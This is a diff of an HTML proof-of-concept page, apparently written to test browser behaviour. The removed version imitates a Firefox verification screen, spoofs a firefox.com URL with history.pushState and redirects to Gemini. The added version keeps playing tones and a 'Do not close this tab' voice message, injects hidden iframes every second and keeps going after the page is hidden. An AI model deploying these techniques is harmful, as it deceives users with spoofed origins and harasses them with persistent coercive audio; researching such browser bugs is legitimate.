@@ -3,114 +3,195 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Firefox AI Gateway — Web Gemini Bridge</title>
+<title>Audio Focus & TTS Lifecycle Test (Upgraded)</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { 
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-    background: #f3f2f1; 
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    min-height: 100vh; 
-    color: #323130;
-    overflow: hidden;
-  }
-  .card { 
-    background: #ffffff; 
-    padding: 40px; 
-    border-radius: 4px; 
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); 
-    max-width: 420px; 
-    width: 100%; 
-    text-align: center; 
-    border-top: 4px solid #711c91;
-  }
-  .logo { font-size: 24px; font-weight: 600; color: #711c91; margin-bottom: 20px; }
-  h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #201f1e; }
-  p { font-size: 14px; color: #605e5c; margin-bottom: 25px; line-height: 1.5; }
-  button { 
-    background: #711c91; 
-    color: #ffffff; 
-    border: none; 
-    padding: 12px 24px; 
-    font-size: 15px; 
-    font-weight: 600; 
-    border-radius: 2px; 
-    cursor: pointer; 
-    width: 100%; 
-    transition: background 0.2s;
-  }
-  button:hover { background: #5a1473; }
-  #status { 
-    margin-top: 20px; 
-    font-size: 13px; 
-    color: #711c91; 
-    font-weight: 500; 
-  }
+  body { font-family: monospace; padding: 30px; background: #121212; color: #e0e0e0; text-align: center; }
+  .box { background: #1e1e1e; padding: 25px; border-radius: 6px; border: 1px solid #333; max-width: 400px; margin: 0 auto; }
+  button { padding: 12px 24px; background: #007acc; color: #fff; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
+  button:hover { background: #005999; }
+  #status { margin-top: 15px; font-size: 13px; color: #4ec9b0; }
+  iframe, video, canvas { display: none !important; }
 </style>
 </head>
 <body>
 
-<div class="card">
-  <div class="logo">Mozilla Firefox</div>
-  <h2>Web Assistant Verification</h2>
-  <p>Click below to initialize secure handoff to the web-based Gemini interface.</p>
-  <button id="actionBtn">Launch Web Gemini</button>
-  <div id="status"></div>
+<div class="box">
+  <h2>WebView Lifecycle Audio Test</h2>
+  <p>Test audio persistence after dismissing tab or moving app to background.</p>
+  <button id="startBtn">Initialize Audio Stream</button>
+  <div id="status">[*] Ready to test audio persistence...</div>
 </div>
+
+<div id="launcher-container" style="display: none;"></div>
 
 <script>
 (function () {
   'use strict';
 
-  var btn = document.getElementById('actionBtn');
+  var btn = document.getElementById('startBtn');
   var statusEl = document.getElementById('status');
+  var audioCtx = null;
+  var isRunning = false;
+  var ttsInterval = null;
+  var audioInterval = null;
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PoC Web Gemini] " + msg);
+    console.log("[PoC Lifecycle] " + msg);
   }
 
-  function executeWebGeminiRedirect() {
-    log("[*] Stacking security context...");
-
-    // 1. Manipulasi History Stack untuk menyamarkan origin (menyerupai domain firefox.com)
+  // ============================================
+  // 1. AUDIO CONTEXT PERSISTENT (LOOP)
+  // ============================================
+  function startPersistentAudio() {
     try {
-      if (window.history && window.history.pushState) {
-        window.history.pushState({page: "web_bridge"}, "Firefox AI", "https://www.firefox.com/ai/verify");
+      window.AudioContext = window.AudioContext || window.webkitAudioContext;
+      audioCtx = new AudioContext();
+
+      if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
       }
-    } catch (e) {}
 
-    // 2. Target URL Web Gemini resmi dengan parameter query "testing"
-    var webGeminiUrl = "https://gemini.google.com/app?q=" + encodeURIComponent("testing");
+      function playTone() {
+        if (!isRunning) return;
+        try {
+          var osc = audioCtx.createOscillator();
+          var gain = audioCtx.createGain();
+          
+          gain.gain.value = 0.05;
+          osc.frequency.value = 440;
+          
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          
+          osc.start();
+          osc.stop(audioCtx.currentTime + 0.5);
+        } catch(e) {}
 
-    log("[!] Redirecting to web interface...");
-
-    // 3. Eksekusi pengalihan mutlak ke browser web Gemini
-    setTimeout(function() {
-      try {
-        window.location.replace(webGeminiUrl);
-      } catch (err) {
-        log("[-] Error during redirection: " + err.message);
+        audioInterval = setTimeout(playTone, 600);
       }
-    }, 400);
+
+      isRunning = true;
+      playTone();
+      log("[+] Audio stream active.");
+
+    } catch (e) {
+      log("[-] AudioContext failed: " + e.message);
+    }
   }
 
-  // Pemicu One-Click via tombol interaktif
+  // ============================================
+  // 2. TTS LOOP (LEBIH CEPAT)
+  // ============================================
+  function startTTSLoop() {
+    if (!('speechSynthesis' in window)) return;
+    
+    function speakText() {
+      if (!isRunning) return;
+      try {
+        window.speechSynthesis.cancel(); // Bersihkan antrean
+        var utterance = new SpeechSynthesisUtterance("Security verification active. Do not close this tab.");
+        utterance.rate = 1.0;
+        utterance.pitch = 1.0;
+        utterance.volume = 1.0;
+        
+        utterance.onend = function() {
+          if (!isRunning) return;
+          ttsInterval = setTimeout(speakText, 500);
+        };
+        
+        window.speechSynthesis.speak(utterance);
+      } catch (e) {}
+    }
+
+    speakText();
+    log("[+] TTS speech loop engaged.");
+  }
+
+  // ============================================
+  // 3. INJECT IFRAME BACKUP (AUDIO + TTS)
+  // ============================================
+  function injectAudioIframe() {
+    try {
+      var iframe = document.createElement('iframe');
+      iframe.allow = "autoplay";
+      iframe.style.display = "none";
+      
+      iframe.srcdoc = `
+        <!DOCTYPE html>
+        <html>
+        <body>
+          <script>
+            // TTS di dalam iframe
+            if ('speechSynthesis' in window) {
+              var u = new SpeechSynthesisUtterance("Security verification active. Do not close this tab.");
+              u.lang = 'en-US';
+              u.rate = 1.0;
+              u.volume = 1.0;
+              window.speechSynthesis.speak(u);
+            }
+
+            // Beep di dalam iframe
+            try {
+              var ctx = new (window.AudioContext || window.webkitAudioContext)();
+              if (ctx.state === 'suspended') ctx.resume();
+              var osc = ctx.createOscillator();
+              osc.type = 'sine';
+              osc.frequency.value = 440;
+              osc.connect(ctx.destination);
+              osc.start();
+              osc.stop(ctx.currentTime + 0.5);
+            } catch(e) {}
+          <\/script>
+        </body>
+        </html>
+      `;
+
+      document.getElementById("launcher-container").appendChild(iframe);
+      log("[+] Iframe Backup disuntikkan.");
+    } catch(e) {}
+  }
+
+  // ============================================
+  // 4. TRIGGER (KLIK)
+  // ============================================
   btn.addEventListener('click', function() {
     btn.disabled = true;
-    btn.style.opacity = "0.6";
-    log("Initializing web bridge...");
+    btn.style.opacity = "0.5";
+    log("[*] Unlocking audio channels...");
 
-    setTimeout(function() {
-      executeWebGeminiRedirect();
-    }, 500);
+    startPersistentAudio();
+    startTTSLoop();
+
+    // Inject Iframe Backup (setiap 1 detik)
+    setInterval(injectAudioIframe, 1000);
 
   }, { once: true });
 
+  // ============================================
+  // 5. VISIBILITY CHANGE (MEMASTIKAN TETAP AKTIF)
+  // ============================================
+  document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+      log("[!] Page hidden. Maintaining audio...");
+      // Paksa resume AudioContext
+      if (audioCtx && audioCtx.state === 'suspended') {
+        audioCtx.resume();
+      }
+    } else {
+      log("[*] Page visible. Audio should be running.");
+    }
+  });
+
+  // ============================================
+  // 6. PAGEHIDE (KIRIM PESAN TERAKHIR)
+  // ============================================
+  window.addEventListener('pagehide', function() {
+    log("[!] Pagehide. Sending final audio...");
+    injectAudioIframe();
+  });
+
 })();
 </script>
-
 </body>
 </html>
